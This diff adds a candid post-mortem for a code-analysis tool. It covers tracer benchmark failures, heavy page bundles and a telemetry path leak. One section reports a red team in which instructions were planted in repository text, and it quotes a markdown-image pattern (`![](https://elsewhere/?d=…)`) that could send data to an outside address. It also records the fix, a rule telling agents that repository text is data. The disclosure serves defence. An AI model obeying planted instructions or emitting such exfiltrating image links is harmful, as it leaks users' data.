@@ -1,0 +1,73 @@
+Building a tool that says "here is the evidence" means holding it to its own standard. These are
+the places where repo-sensei didn't measure up when we finally measured, what we changed, and
+what is still open.
+
+## The tracer was good at the code it grew up on
+
+The tracer follows a feature from a page down to the table it touches, with no model in the loop.
+It was developed against two open-source projects, and on those it looked excellent. Then we
+labelled 101 flows by hand across five repositories, three of them new to it, and published them
+as [CrossLayerBench](/benchmarks).
+
+On the project it was tuned on, it reached 95% of the hops of a flow, and one of its three
+offered paths was exactly right every time. On the three projects it had never seen, it reached
+a quarter to a third of the hops. It never once produced an exact path. The failures had a
+pattern:
+
+- an API helper that builds its URLs at run time;
+- Next.js handlers found by where their file sits, not by a registration call;
+- Flask-RESTful resources registered as plain statements;
+- Redux thunks.
+
+Each is a rule the tracer doesn't have yet.
+
+We also renamed every project-defined identifier in the Python and TypeScript repositories and
+ran it again. Scores fell sharply, even on the projects it was tuned on. Part of what looked like
+tracing was matching names.
+
+**What changed:** these numbers are on the benchmarks page, including the bad ones, and the flows
+are public so anyone can check. Twenty more flows are kept private, so a gain on the public ones
+can be confirmed. **Still open:** the rules above.
+
+## An answer could have phoned home
+
+Answers are written from a repository's text, and a repository can contain anything, including
+a comment written for an AI to read. We ran a red team against our own agents, with a model
+scripted to obey planted instructions. The tools held: nothing outside the checkout was read,
+and nothing was written that the plan didn't name.
+
+The answer renderer didn't hold. It drew markdown images, so an answer containing
+`![](https://elsewhere/?d=…)` would have made the reader's browser fetch that address. Our
+Content Security Policy blocked it. That was the only wall, and it shouldn't have been.
+
+**What changed:** an image in an answer is now its words and a link that shows where it points.
+It is never loaded. The instructions to every agent say the repository's text is data, and the
+tests that drive the obedient model run on every change.
+
+## The pages were two to four times too heavy
+
+Our design gave each page of the app 180 KB of JavaScript, compressed, before it can run. When we
+finally counted, the lightest page in the app was over 250 KB, and the Ask page was 800 KB. The
+biggest single cause was one line: a module of small helpers imported a class from the AI SDK.
+Every page that used one of the helpers also loaded the SDK, and the schema library under it.
+
+**What changed:** that class moved to its own module, loaded only where a question is sent. The
+answer's markdown renderer, the code viewer and the animation features load on demand. The Ask
+page is down to about 510 KB, and every route now has a ceiling in CI that it can't grow past.
+**Still open:** the target. React and Next.js alone are about 130 KB, so the rest of the app has
+50 KB to work with, and today it uses far more.
+
+## The speed numbers almost carried file names
+
+To show each team how fast the app is for them, the pages report their load and response times
+with the route they were on, as a pattern like `/[org]/[repo]/code/[...path]`, never the names
+in it. Review caught that for a file path with an escaped character, the pattern matching failed,
+and the directory names went through as words.
+
+**What changed:** the route words the app uses are an allowlist, and anything else is sent as
+`_`. A test walks the app's routes to keep the list complete.
+
+## What we take from it
+
+Most of these were found by measuring something we had assumed. None of them was found by
+looking harder at the code that caused it.
